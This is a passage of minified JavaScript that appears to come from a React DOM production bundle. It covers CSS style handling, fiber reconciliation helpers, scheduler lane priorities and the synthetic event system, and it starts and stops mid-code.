Za={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Kb=["Webkit","ms","Moz","O"];Object.keys(Za).forEach(function(t){Kb.forEach(function(e){e=e+t.charAt(0).toUpperCase()+t.substring(1),Za[e]=Za[t]})});function Ap(t,e,r){return e==null||typeof e=="boolean"||e===""?"":r||typeof e!="number"||e===0||Za.hasOwnProperty(t)&&Za[t]?(""+e).trim():e+"px"}function Rp(t,e){t=t.style;for(var r in e)if(e.hasOwnProperty(r)){var n=r.indexOf("--")===0,s=Ap(r,e[r],n);r==="float"&&(r="cssFloat"),n?t.setProperty(r,s):t[r]=s}}var qb=Oe({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function jd(t,e){if(e){if(qb[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(D(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(D(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(D(61))}if(e.style!=null&&typeof e.style!="object")throw Error(D(62))}}function _d(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Nd=null;function nh(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Sd=null,Ys=null,Js=null;function $f(t){if(t=Ki(t)){if(typeof Sd!="function")throw Error(D(280));var e=t.stateNode;e&&(e=Ul(e),Sd(t.stateNode,t.type,e))}}function Ip(t){Ys?Js?Js.push(t):Js=[t]:Ys=t}function Lp(){if(Ys){var t=Ys,e=Js;if(Js=Ys=null,$f(t),e)for(t=0;t<e.length;t++)$f(e[t])}}function Mp(t,e){return t(e)}function Op(){}var Ec=!1;function $p(t,e,r){if(Ec)return t(e,r);Ec=!0;try{return Mp(t,e,r)}finally{Ec=!1,(Ys!==null||Js!==null)&&(Op(),Lp())}}function fi(t,e){var r=t.stateNode;if(r===null)return null;var n=Ul(r);if(n===null)return null;r=n[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(n=!n.disabled)||(t=t.type,n=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!n;break e;default:t=!1}if(t)return null;if(r&&typeof r!="function")throw Error(D(231,e,typeof r));return r}var kd=!1;if(Dr)try{var $a={};Object.defineProperty($a,"passive",{get:function(){kd=!0}}),window.addEventListener("test",$a,$a),window.removeEventListener("test",$a,$a)}catch{kd=!1}function Qb(t,e,r,n,s,i,o,l,c){var d=Array.prototype.slice.call(arguments,3);try{e.apply(r,d)}catch(u){this.onError(u)}}var ei=!1,qo=null,Qo=!1,Ed=null,Yb={onError:function(t){ei=!0,qo=t}};function Jb(t,e,r,n,s,i,o,l,c){ei=!1,qo=null,Qb.apply(Yb,arguments)}function Xb(t,e,r,n,s,i,o,l,c){if(Jb.apply(this,arguments),ei){if(ei){var d=qo;ei=!1,qo=null}else throw Error(D(198));Qo||(Qo=!0,Ed=d)}}function ws(t){var e=t,r=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(r=e.return),t=e.return;while(t)}return e.tag===3?r:null}function Up(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function Uf(t){if(ws(t)!==t)throw Error(D(188))}function Zb(t){var e=t.alternate;if(!e){if(e=ws(t),e===null)throw Error(D(188));return e!==t?null:t}for(var r=t,n=e;;){var s=r.return;if(s===null)break;var i=s.alternate;if(i===null){if(n=s.return,n!==null){r=n;continue}break}if(s.child===i.child){for(i=s.child;i;){if(i===r)return Uf(s),t;if(i===n)return Uf(s),e;i=i.sibling}throw Error(D(188))}if(r.return!==n.return)r=s,n=i;else{for(var o=!1,l=s.child;l;){if(l===r){o=!0,r=s,n=i;break}if(l===n){o=!0,n=s,r=i;break}l=l.sibling}if(!o){for(l=i.child;l;){if(l===r){o=!0,r=i,n=s;break}if(l===n){o=!0,n=i,r=s;break}l=l.sibling}if(!o)throw Error(D(189))}}if(r.alternate!==n)throw Error(D(190))}if(r.tag!==3)throw Error(D(188));return r.stateNode.current===r?t:e}function Dp(t){return t=Zb(t),t!==null?zp(t):null}function zp(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=zp(t);if(e!==null)return e;t=t.sibling}return null}var Fp=Lt.unstable_scheduleCallback,Df=Lt.unstable_cancelCallback,ew=Lt.unstable_shouldYield,tw=Lt.unstable_requestPaint,De=Lt.unstable_now,rw=Lt.unstable_getCurrentPriorityLevel,sh=Lt.unstable_ImmediatePriority,Bp=Lt.unstable_UserBlockingPriority,Yo=Lt.unstable_NormalPriority,nw=Lt.unstable_LowPriority,Vp=Lt.unstable_IdlePriority,Ll=null,Nr=null;function sw(t){if(Nr&&typeof Nr.onCommitFiberRoot=="function")try{Nr.onCommitFiberRoot(Ll,t,void 0,(t.current.flags&128)===128)}catch{}}var or=Math.clz32?Math.clz32:ow,aw=Math.log,iw=Math.LN2;function ow(t){return t>>>=0,t===0?32:31-(aw(t)/iw|0)|0}var io=64,oo=4194304;function Ya(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function Jo(t,e){var r=t.pendingLanes;if(r===0)return 0;var n=0,s=t.suspendedLanes,i=t.pingedLanes,o=r&268435455;if(o!==0){var l=o&~s;l!==0?n=Ya(l):(i&=o,i!==0&&(n=Ya(i)))}else o=r&~s,o!==0?n=Ya(o):i!==0&&(n=Ya(i));if(n===0)return 0;if(e!==0&&e!==n&&!(e&s)&&(s=n&-n,i=e&-e,s>=i||s===16&&(i&4194240)!==0))return e;if(n&4&&(n|=r&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=n;0<e;)r=31-or(e),s=1<<r,n|=t[r],e&=~s;return n}function lw(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function cw(t,e){for(var r=t.suspendedLanes,n=t.pingedLanes,s=t.expirationTimes,i=t.pendingLanes;0<i;){var o=31-or(i),l=1<<o,c=s[o];c===-1?(!(l&r)||l&n)&&(s[o]=lw(l,e)):c<=e&&(t.expiredLanes|=l),i&=~l}}function Cd(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function Hp(){var t=io;return io<<=1,!(io&4194240)&&(io=64),t}function Cc(t){for(var e=[],r=0;31>r;r++)e.push(t);return e}function Gi(t,e,r){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-or(e),t[e]=r}function dw(t,e){var r=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var n=t.eventTimes;for(t=t.expirationTimes;0<r;){var s=31-or(r),i=1<<s;e[s]=0,n[s]=-1,t[s]=-1,r&=~i}}function ah(t,e){var r=t.entangledLanes|=e;for(t=t.entanglements;r;){var n=31-or(r),s=1<<n;s&e|t[n]&e&&(t[n]|=e),r&=~s}}var je=0;function Gp(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var Wp,ih,Kp,qp,Qp,Td=!1,lo=[],fn=null,mn=null,pn=null,mi=new Map,pi=new Map,tn=[],uw="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function zf(t,e){switch(t){case"focusin":case"focusout":fn=null;break;case"dragenter":case"dragleave":mn=null;break;case"mouseover":case"mouseout":pn=null;break;case"pointerover":case"pointerout":mi.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":pi.delete(e.pointerId)}}function Ua(t,e,r,n,s,i){return t===null||t.nativeEvent!==i?(t={blockedOn:e,domEventName:r,eventSystemFlags:n,nativeEvent:i,targetContainers:[s]},e!==null&&(e=Ki(e),e!==null&&ih(e)),t):(t.eventSystemFlags|=n,e=t.targetContainers,s!==null&&e.indexOf(s)===-1&&e.push(s),t)}function hw(t,e,r,n,s){switch(e){case"focusin":return fn=Ua(fn,t,e,r,n,s),!0;case"dragenter":return mn=Ua(mn,t,e,r,n,s),!0;case"mouseover":return pn=Ua(pn,t,e,r,n,s),!0;case"pointerover":var i=s.pointerId;return mi.set(i,Ua(mi.get(i)||null,t,e,r,n,s)),!0;case"gotpointercapture":return i=s.pointerId,pi.set(i,Ua(pi.get(i)||null,t,e,r,n,s)),!0}return!1}function Yp(t){var e=ns(t.target);if(e!==null){var r=ws(e);if(r!==null){if(e=r.tag,e===13){if(e=Up(r),e!==null){t.blockedOn=e,Qp(t.priority,function(){Kp(r)});return}}else if(e===3&&r.stateNode.current.memoizedState.isDehydrated){t.blockedOn=r.tag===3?r.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Ao(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var r=Pd(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(r===null){r=t.nativeEvent;var n=new r.constructor(r.type,r);Nd=n,r.target.dispatchEvent(n),Nd=null}else return e=Ki(r),e!==null&&ih(e),t.blockedOn=r,!1;e.shift()}return!0}function Ff(t,e,r){Ao(t)&&r.delete(e)}function fw(){Td=!1,fn!==null&&Ao(fn)&&(fn=null),mn!==null&&Ao(mn)&&(mn=null),pn!==null&&Ao(pn)&&(pn=null),mi.forEach(Ff),pi.forEach(Ff)}function Da(t,e){t.blockedOn===e&&(t.blockedOn=null,Td||(Td=!0,Lt.unstable_scheduleCallback(Lt.unstable_NormalPriority,fw)))}function gi(t){function e(s){return Da(s,t)}if(0<lo.length){Da(lo[0],t);for(var r=1;r<lo.length;r++){var n=lo[r];n.blockedOn===t&&(n.blockedOn=null)}}for(fn!==null&&Da(fn,t),mn!==null&&Da(mn,t),pn!==null&&Da(pn,t),mi.forEach(e),pi.forEach(e),r=0;r<tn.length;r++)n=tn[r],n.blockedOn===t&&(n.blockedOn=null);for(;0<tn.length&&(r=tn[0],r.blockedOn===null);)Yp(r),r.blockedOn===null&&tn.shift()}var Xs=Gr.ReactCurrentBatchConfig,Xo=!0;function mw(t,e,r,n){var s=je,i=Xs.transition;Xs.transition=null;try{je=1,oh(t,e,r,n)}finally{je=s,Xs.transition=i}}function pw(t,e,r,n){var s=je,i=Xs.transition;Xs.transition=null;try{je=4,oh(t,e,r,n)}finally{je=s,Xs.transition=i}}function oh(t,e,r,n){if(Xo){var s=Pd(t,e,r,n);if(s===null)Uc(t,e,n,Zo,r),zf(t,n);else if(hw(s,t,e,r,n))n.stopPropagation();else if(zf(t,n),e&4&&-1<uw.indexOf(t)){for(;s!==null;){var i=Ki(s);if(i!==null&&Wp(i),i=Pd(t,e,r,n),i===null&&Uc(t,e,n,Zo,r),i===s)break;s=i}s!==null&&n.stopPropagation()}else Uc(t,e,n,null,r)}}var Zo=null;function Pd(t,e,r,n){if(Zo=null,t=nh(n),t=ns(t),t!==null)if(e=ws(t),e===null)t=null;else if(r=e.tag,r===13){if(t=Up(e),t!==null)return t;t=null}else if(r===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return Zo=t,null}function Jp(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(rw()){case sh:return 1;case Bp:return 4;case Yo:case nw:return 16;case Vp:return 536870912;default:return 16}default:return 16}}var dn=null,lh=null,Ro=null;function Xp(){if(Ro)return Ro;var t,e=lh,r=e.length,n,s="value"in dn?dn.value:dn.textContent,i=s.length;for(t=0;t<r&&e[t]===s[t];t++);var o=r-t;for(n=1;n<=o&&e[r-n]===s[i-n];n++);return Ro=s.slice(t,1<n?1-n:void 0)}function Io(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function co(){return!0}function Bf(){return!1}function Ot(t){function e(r,n,s,i,o){this._reactName=r,this._targetInst=s,this.type=n,this.nativeEvent=i,this.target=o,this.currentTarget=null;for(var l in t)t.hasOwnProperty(l)&&(r=t[l],this[l]=r?r(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?co:Bf,this.isPropagationStopped=Bf,this}return Oe(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var r=this.nativeEvent;r&&(r.preventDefault?r.preventDefault():typeof r.returnValue!="unknown"&&(r.returnValue=!1),this.isDefaultPrevented=co)},stopPropagation:function(){var r=this.nativeEvent;r&&(r.stopPropagation?r.stopPropagation():typeof r.cancelBubble!="unknown"&&(r.cancelBubble=!0),this.isPropagationStopped=co)},persist:function(){},isPersistent:co}),e}var Ea={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ch=Ot(Ea),Wi=Oe({},Ea,{view:0,detail:0}),gw=Ot(Wi),Tc,Pc,za,Ml=Oe({},Wi,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:dh,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==za&&(za&&t.type==="mousemove"?(Tc=t.screenX-za.screenX,Pc=t.screenY-za.screenY):Pc=Tc=0,za=t),Tc)},movementY:function(t){return"movementY"in t?t.movementY:Pc}}),Vf=Ot(Ml),xw=Oe({},Ml,{dataTransfer:0}),yw=Ot(xw),vw=Oe({},Wi,{relatedTarget:0}),Ac=Ot(vw),bw=Oe({},Ea,{animationName:0,elapsedTime:0,pseudoElement:0}),ww=Ot(bw),jw=Oe({},Ea,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),_w=Ot(jw),Nw=Oe({},Ea,{data:0}),Hf=Ot(Nw),Sw={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},kw={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Ew={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Cw(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=Ew[t])?!!e[t]:!1}function dh(){return Cw}var Tw=Oe({},Wi,{key:function(t){if(t.key){var e=Sw[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Io(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?kw[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:dh,charCode:function(t){return t.type==="keypress"?Io(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Io(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),Pw=Ot(Tw),Aw=Oe({},Ml,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Gf=Ot(Aw),Rw=Oe({},Wi,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:dh}),Iw=Ot(Rw),Lw=Oe({},Ea,{propertyName:0,elapsedTime:0,pseudoElement:0}),Mw=Ot(Lw),Ow=Oe({},Ml,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),$w=Ot(Ow),Uw=[9,13,27,32],uh=Dr&&"CompositionEvent"in window,ti=null;Dr&&"documentMode"in document&&(ti=document.documentMode);var Dw=Dr&&"TextEvent"in window&&!ti,Zp=Dr&&(!uh||ti&&8<ti&&11>=ti),Wf=" ",Kf=!1;function eg(t,e){switch(t){case"keyup":return Uw.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function tg(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var Us=!1;function zw(t,e){switch(t){case"compositionend":return tg(e);case"keypress":return e.which!==32?null:(Kf=!0,Wf);case"textInput":return t=e.data,t===Wf&&Kf?null:t;default:return null}}function Fw(t,e){if(Us)return t==="compositionend"||!uh&&eg(t,e)?(t=Xp(),Ro=lh=dn=null,Us=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return Zp&&e.locale!=="ko"?null:e.data;default:return null}}var Bw={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function qf(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!Bw[t.type]:e==="textarea"}function rg(t,e,r,n){Ip(n),e=el(e,"onChange"),0<e.length&&(r=new ch("onChange","change",null,r,n),t.push({event:r,listeners:e}))}var ri=null,xi=null;function Vw(t){fg(t,0)}function Ol(t){var e=Fs(t);if(kp(e))return t}function Hw(t,e){if(t==="change")return e}var ng=!1;if(Dr){var Rc;if(Dr){var Ic="oninput"in document;if(!Ic){var Qf=document.createElement("div");Qf.setAttribute("oninput","return;"),Ic=typeof Qf.oninput=="function"}Rc=Ic}else Rc=!1;ng=Rc&&(!document.documentMode||9<document.documentMode)}function Yf(){ri&&(ri.detachEvent("onpropertychange",sg),xi=ri=null)}function sg(t){if(t.propertyName==="value"&&Ol(xi)){var e=[];rg(e,xi,t,nh(t)),$p(Vw,e)}}function Gw(t,e,r){t==="focusin"?(Yf(),ri=e,xi=r,ri.attachEvent("onpropertychange",sg)):t==="focusout"&&Yf()}function Ww(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return Ol(xi)}function Kw(t,e){if(t==="click")return Ol(e)}function qw(t,e){if(t==="input"||t==="change")return Ol(e)}function Qw(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var dr=typeof Object.is=="function"?Object.is:Qw;function yi(t,e){if(dr(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var r=Object.keys(t),n=Object.keys(e);if(r.length!==n.length)return!1;for(n=0;n<r.length;n++){var s=r[n];if(!hd.call(e,s)||!dr(t[s],e[s]))return!1}return!0}function Jf(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function Xf(t,e){var r=Jf(t);t=0;for(var n;r;){if(r.nodeType===3){if(n=t+r.textContent.length,t<=e&&n>=e)return{node:r,offset:e-t};t=n}e:{for(;r;){if(r.nextSibling){r=r.nextSibling;break e}r=r.parentNode}r=void 0}r=Jf(r)}}function ag(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?ag(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function ig(){for(var t=window,e=Ko();e instanceof t.HTMLIFrameElement;){try{var r=typeof e.contentWindow.location.href=="string"}catch{r=!1}if(r)t=e.contentWindow;else break;e=Ko(t.document)}return e}function hh(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function Yw(t){var e=ig(),r=t.focusedElem,n=t.selectionRange;if(e!==r&&r&&r.ownerDocument&&ag(r.ownerDocument.documentElement,r)){if(n!==null&&hh(r)){if(e=n.start,t=n.end,t===void 0&&(t=e),"selectionStart"in r)r.selectionStart=e,r.selectionEnd=Math.min(t,r.value.length);else if(t=(e=r.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var s=r.textContent.length,i=Math.min(n.start,s);n=n.end===void 0?i:Math.min(n.end,s),!t.extend&&i>n&&(s=n,n=i,i=s),s=Xf(r,i);var o=Xf(r,n);s&&o&&(t.rangeCount!==1||t.anchorNode!==s.node||t.anchorOffset!==s.offset||t.focusNode!==o.node||t.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(s.node,s.offset),t.removeAllRanges(),i>n?(t.addRange(e),t.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),t.addRange(e)))}}for(e=[],t=r;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof r.focus=="function"&&r.focus(),r=0;r<e.length;r++)t=e[r],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var Jw=Dr&&"documentMode"in document&&11>=document.documentMode,Ds=null,Ad=null,ni=null,Rd=!1;function Zf(t,e,r){var n=r.window===r?r.document:r.nodeType===9?r:r.ownerDocument;Rd||Ds==null||Ds!==Ko(n)||(n=Ds,"selectionStart"in n&&hh(n)?n={start:n.selectionStart,end:n.selectionEnd}:(n=(n.ownerDocument&&n.ownerDocument.defaultView||window).getSelection(),n={anchorNode:n.anchorNode,anchorOffset:n.anchorOffset,focusNode:n.focusNode,focusOffset:n.focusOffset}),ni&&yi(ni,n)||(ni=n,n=el(Ad,"onSelect"),0<n.length&&(e=new ch("onSelect","select",null,e,r),t.push({event:e,listeners:n}),e.target=Ds)))}function uo(t,e){var r={};return r[t.toLowerCase()]=e.toLowerCase(),r["Webkit"+t]="webkit"+e,r["Moz"+t]="moz"+e,r}var zs={animationend:uo("Animation","AnimationEnd"),animationiteration:uo("Animation","AnimationIteration"),animationstart:uo("Animation","AnimationStart"),transitionend:uo("Transition","TransitionEnd")},Lc={},og={};Dr&&(og=document.createElement("div").style,"AnimationEvent"in window||(delete zs.animationend.animation,delete zs.animationiteration.animation,delete zs.animationstart.animation),"TransitionEvent"in window||delete zs.transitionend.transition);function $l(t){if(Lc[t])return Lc[t];if(!zs[t])return t;var e=zs[t],r;for(r in e)if(e.hasOwnProperty(r)&&r in og)return Lc[t]=e[r];return t}var lg=$l("animationend"),cg=$l("animationiteration"),dg=$l("animationstart"),ug=$l("transitionend"),hg=new Map,em="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function An(t,e){hg.set(t,e),bs(e,[t])}for(var Mc=0;Mc<em.length;Mc++){var Oc=em[Mc],Xw=Oc.toLowerCase(),Zw=Oc[0].toUpperCase()+Oc.slice(1);An(Xw,"on"+Zw)}An(lg,"onAnimationEnd");An(cg,"onAnimationIteration");An(dg,"onAnimationStart");An("dblclick","onDoubleClick");An("focusin","onFocus");An("focusout","onBlur");An(ug,"onTransitionEnd");fa("onMouseEnter",["mouseout","mouseover"]);fa("onMouseLeave",["mouseout","mouseover"]);fa("onPointerEnter",["pointerout","pointerover"]);fa("onPointerLeave",["pointerout","pointerover"]);bs("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));bs("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));bs("onBeforeInput",["compositionend","keypress","textInput","paste"]);bs("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));bs("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));bs("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ja="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),e1=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ja));function tm(t,e,r){var n=t.type||"unknown-event";t.currentTarget=r,Xb(n,e,void 0,t),t.currentTarget=null}function fg(t,e){e=(e&4)!==0;for(var r=0;r<t.length;r++){var n=t[r],s=n.event;n=n.listeners;e:{var i=void 0;if(e)for(var o=n.length-1;0<=o;o--){var l=n[o],c=l.instance,d=l.currentTarget;if(l=l.listener,c!==i&&s.isPropagationStopped())break e;tm(s,l,d),i=c}else for(o=0;o<n.length;o++){if(l=n[o],c=l.instance,d=l.currentTarget,l=l.listener,c!==i&&s.isPropagationStopped())break e;tm(s,l,d),i=c}}}if(Qo)throw t=Ed,Qo=!1,Ed=null,t}function Ae(t,e){var r=e[$d];r===void 0&&(r=e[$d]=new Set);var n=t+"__bubble";r.has(n)||(mg(e,t,2,!1),r.add(n))}function $c(t,e,r){var n=0;e&&(n|=4),mg(r,t,n,e)}var ho="_reactListening"+Math.random().toString(36).slice(2);function vi(t){if(!t[ho]){t[ho]=!0,wp.forEach(function(r){r!=="selectionchange"&&(e1.has(r)||$c(r,!1,t),$c(r,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[ho]||(e[ho]=!0,$c("selectionchange",!1,e))}}function mg(t,e,r,n){switch(Jp(e)){case 1:var s=mw;break;case 4:s=pw;break;default:s=oh}r=s.bind(null,e,r,t),s=void 0,!kd||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(s=!0),n?s!==void 0?t.addEventListener(e,r,{capture:!0,passive:s}):t.addEventListener(e,r,!0):s!==void 0?t.addEventListener(e,r,{passive:s}):t.addEventListener(e,r,!1)}function Uc(t,e,r,n,s){var i=n;if(!(e&1)&&!(e&2)&&n!==null)e:for(;;){if(n===null)return;var o=n.tag;if(o===3||o===4){var l=n.stateNode.containerInfo;if(l===s||l.nodeType===8&&l.parentNode===s)break;if(o===4)for(o=n.return;o!==null;){var c=o.tag;if((c===3||c===4)&&(c=o.stateNode.containerInfo,c===s||c.nodeType===8&&c.parentNode===s))return;o=o.return}for(;l!==null;){if(o=ns(l),o===null)return;if(c=o.tag,c===5||c===6){n=i=o;continue e}l=l.parentNode}}n=n.return}$p(function(){var 